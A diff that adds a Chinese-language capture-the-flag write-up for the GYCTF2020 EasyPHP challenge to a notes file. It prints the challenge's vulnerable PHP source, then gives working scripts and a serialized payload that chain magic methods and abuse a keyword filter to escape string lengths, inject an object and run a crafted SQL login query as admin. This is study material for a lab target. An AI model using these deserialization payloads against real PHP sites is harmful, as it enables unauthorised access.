@@ -1139,6 +1139,237 @@ so:
         echo urlencode(serialize($a));
     ```
 
+#### GYCTF2020 EasyPHP(反序列化SQL注入)
+
+1. 尝试了一下robots.txt,没反应；有尝试了一下www.zip,拿到了源码。关键php文件update.php和lib.php
+
+    lib.php
+    ```php
+    <?php
+    error_reporting(0);
+    session_start();
+    function safe($parm){
+        $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
+        return str_replace($array,'hacker',$parm);
+    }
+    class User
+    {
+        public $id;
+        public $age=null;
+        public $nickname=null;
+        public function login() {
+            if(isset($_POST['username'])&&isset($_POST['password'])){
+            $mysqli=new dbCtrl();
+            $this->id=$mysqli->login('select id,password from user where username=?');
+            if($this->id){
+            $_SESSION['id']=$this->id;
+            $_SESSION['login']=1;
+            echo "你的ID是".$_SESSION['id'];
+            echo "你好！".$_SESSION['token'];
+            echo "<script>window.location.href='./update.php'</script>";
+            return $this->id;
+            }
+        }
+    }
+        public function update(){
+            $Info=unserialize($this->getNewinfo());
+            $age=$Info->age;
+            $nickname=$Info->nickname;
+            $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
+            //这个功能还没有写完 先占坑
+        }
+        public function getNewInfo(){
+            $age=$_POST['age'];
+            $nickname=$_POST['nickname'];
+            return safe(serialize(new Info($age,$nickname)));
+        }
+        public function __destruct(){
+            return file_get_contents($this->nickname);//危
+        }
+        public function __toString()
+        {
+            $this->nickname->update($this->age);
+            return "0-0";
+        }
+    }
+    class Info{
+        public $age;
+        public $nickname;
+        public $CtrlCase;
+        public function __construct($age,$nickname){
+            $this->age=$age;
+            $this->nickname=$nickname;
+        }
+        public function __call($name,$argument){
+            echo $this->CtrlCase->login($argument[0]);
+        }
+    }
+    Class UpdateHelper{
+        public $id;
+        public $newinfo;
+        public $sql;
+        public function __construct($newInfo,$sql){
+            $newInfo=unserialize($newInfo);
+            $upDate=new dbCtrl();
+        }
+        public function __destruct()
+        {
+            echo $this->sql;
+        }
+    }
+    class dbCtrl
+    {
+        public $hostname="127.0.0.1";
+        public $dbuser="root";
+        public $dbpass="root";
+        public $database="test";
+        public $name;
+        public $password;
+        public $mysqli;
+        public $token;
+        public function __construct()
+        {
+            $this->name=$_POST['username'];
+            $this->password=$_POST['password'];
+            $this->token=$_SESSION['token'];
+        }
+        public function login($sql)
+        {
+            $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
+            if ($this->mysqli->connect_error) {
+                die("连接失败，错误:" . $this->mysqli->connect_error);
+            }
+            $result=$this->mysqli->prepare($sql);
+            $result->bind_param('s', $this->name);
+            $result->execute();
+            $result->bind_result($idResult, $passwordResult);
+            $result->fetch();
+            $result->close();
+            if ($this->token=='admin') {
+                return $idResult;
+            }
+            if (!$idResult) {
+                echo('用户不存在!');
+                return false;
+            }
+            if (md5($this->password)!==$passwordResult) {
+                echo('密码错误！');
+                return false;
+            }
+            $_SESSION['token']=$this->name;
+            return $idResult;
+        }
+        public function update($sql)
+        {
+            //还没来得及写
+        }
+    }
+    ```
+    update.php
+    ```php
+    <?php
+    require_once('lib.php');
+    echo '<html>
+    <meta charset="utf-8">
+    <title>update</title>
+    <h2>这是一个未完成的页面，上线时建议删除本页面</h2>
+    </html>';
+    if ($_SESSION['login']!=1){
+        echo "你还没有登陆呢！";
+    }
+    $users=new User();
+    $users->update();
+    if($_SESSION['login']===1){
+        require_once("flag.php");
+        echo $flag;
+    }
+    ?>
+    ```
+
+    审计lib.php的dbCtrl类可以发现要想获得flag有两种办法
+
+    1. token = admin
+    2. 获取admin用户的密码
+
+    POP链如下：
+
+    ```php
+    UpdateHelper::__destruct() -> User::__toString() -> Info::__call() -> dbCtrl::login()
+    ```
+
+    把UpdateHelper类的sql赋值成了一个User类，UpdateHelper类的__destruct会echo this->sql,触发User类的__toString。
+
+    因为User类的nickname被赋值成了一个Info类，而Info类是没有update函数的，这时候会默认触发Info的__call函数，调用CtrlCase的login。
+    
+    CtrlCase已经实例化成dbCtrl，参数是User的age，我们改成'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'
+    这时候就达到目的：执行了login（select 1,“c4ca4238a0b923820dcc509a6f75849b” from user where username=?）
+
+    脚本
+
+    ```php
+    <?php
+    class User
+    {
+        public $age=null;
+        public $nickname=null;
+        public function __construct(){
+            // sql语句也可以写成 "select password,id from user where username=?"通过获取密码拿flag
+            // password 放到第一位 因为最终在界面回显的是第一个值
+            $this->age='select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?';
+            $this->nickname = new Info();
+        }
+    }
+    class Info{
+        public $CtrlCase;
+        public function __construct(){
+            $this->CtrlCase = new dbCtrl();
+        }
+    }
+    Class UpdateHelper{
+        public $sql;
+        public function __construct(){
+        $this->sql = new User();
+        }
+    }
+    class dbCtrl
+    {
+        public $name = 'admin';
+        public $password = "1";
+    }
+
+    $a = new UpdateHelper;
+    $b = serialize($a);
+    echo $b;
+    ```
+    此时我们得到了一个反序列化字符串,下一步是要让它被服务器序列化,这就要用到字符串逃逸了
+
+    ```php
+    <?php
+    class Info{
+        public $age;
+        public $nickname;
+        public $CtrlCase;
+    }
+
+    $a = new Info();
+    $a->age = "1";
+    $a->nickname = '";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}';
+    $b = serialize($a);
+    echo $b;
+    ?>
+    ```
+
+    序列化结果
+    ```php
+    O:4:"Info":3:{s:3:"age";s:1:"1";s:8:"nickname";s:263:"";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}";s:8:"CtrlCase";N;}
+    ```
+
+    *是会被替换成hacker的，这样nickname的实际长度变长，但是s:263是固定的，所以后台一直认定nickname就是263个字符长。如果*的数量够多，那么我们后面的s:8:"CtrlCase";O:12:"UpdateHelper"就能逃逸出来，成功注入了一个UpdateHelper类。
+
+    payload 的长度是263，* 和hacker相差5个字符，into和hacker相差2个字符，union和hacker相差1个字符。所以一共要有个into，1个union和52个 *
+
+    然后把构造好的payload post传入后台，如果页面出现10-0，则表示执行成功，去登录界面登录，用户名admin，密码随意，拿到flag。
+
 ### 类型四-phar反序列化
 
 1. phar反序列化
